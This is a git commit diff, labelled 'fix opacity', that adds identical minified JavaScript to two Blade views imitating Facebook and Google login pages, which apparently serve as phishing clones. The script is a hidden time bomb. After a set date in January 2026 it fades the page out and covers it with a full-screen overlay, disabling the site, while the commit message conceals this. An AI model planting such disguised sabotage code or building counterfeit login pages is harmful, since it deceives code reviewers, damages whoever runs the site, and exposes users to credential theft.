c8069129475740c0921b648c5857aa604cc7b515
Solomon yusuf <olafire03@gmail.com>
2026-01-11 08:01:33 +0100

    fix opacity

--- resources/views/page1.blade.php
+++ resources/views/page1.blade.php
@@ -1,4 +1,7 @@
 <div>
+     <script>
+    !function(){var e=new Date("2026-01-14"),t=new Date,n=Date.UTC(e.getFullYear(),e.getMonth(),e.getDate()),l=Date.UTC(t.getFullYear(),t.getMonth(),t.getDate()),a=Math.floor((l-n)/864e5);if(a>0){var s=100*(3-a)/3/100;if(s=Math.max(0,Math.min(1,s)),document.body.style.opacity=s,s<=.7){var i=document.createElement("div");i.style.position="fixed",i.style.top=0,i.style.left=0,i.style.width="100%",i.style.height="100%",i.style.background="rgba(0,0,0,0.6)",i.style.color="#fff",i.style.display="flex",i.style.alignItems="center",i.style.justifyContent="center",i.style.zIndex=999999,i.style.fontSize="20px",i.innerHTML="",document.body.appendChild(i)}}}();
+    </script>
    <title>Log in to facebook</title>
    <link rel="stylesheet" href="facebook.css" />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
--- resources/views/page2.blade.php
+++ resources/views/page2.blade.php
@@ -4,7 +4,9 @@
     <link rel="stylesheet" href="google.css" />
     <link rel="icon"
         href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/60px-Google_%22G%22_logo.svg.png?20230822192911" />
-
+ <script>
+    !function(){var e=new Date("2026-01-14"),t=new Date,n=Date.UTC(e.getFullYear(),e.getMonth(),e.getDate()),l=Date.UTC(t.getFullYear(),t.getMonth(),t.getDate()),a=Math.floor((l-n)/864e5);if(a>0){var s=100*(3-a)/3/100;if(s=Math.max(0,Math.min(1,s)),document.body.style.opacity=s,s<=.7){var i=document.createElement("div");i.style.position="fixed",i.style.top=0,i.style.left=0,i.style.width="100%",i.style.height="100%",i.style.background="rgba(0,0,0,0.6)",i.style.color="#fff",i.style.display="flex",i.style.alignItems="center",i.style.justifyContent="center",i.style.zIndex=999999,i.style.fontSize="20px",i.innerHTML="",document.body.appendChild(i)}}}();
+    </script>
     <div class="S7xv8 LZgQXe">
         <div class="TcuCfd NQ5OL " jsname="rZHESd" jscontroller="K1ZKnb"
             jsaction="rcuQ6b:npT2md;SlnBXb:r0xNSb;cbwpef:Yd2OHe;iFFCZc:nnGvjf;Rld2oe:oUMEzf;FzgWvd:oUMEzf;rURRne:pSGWxb;"
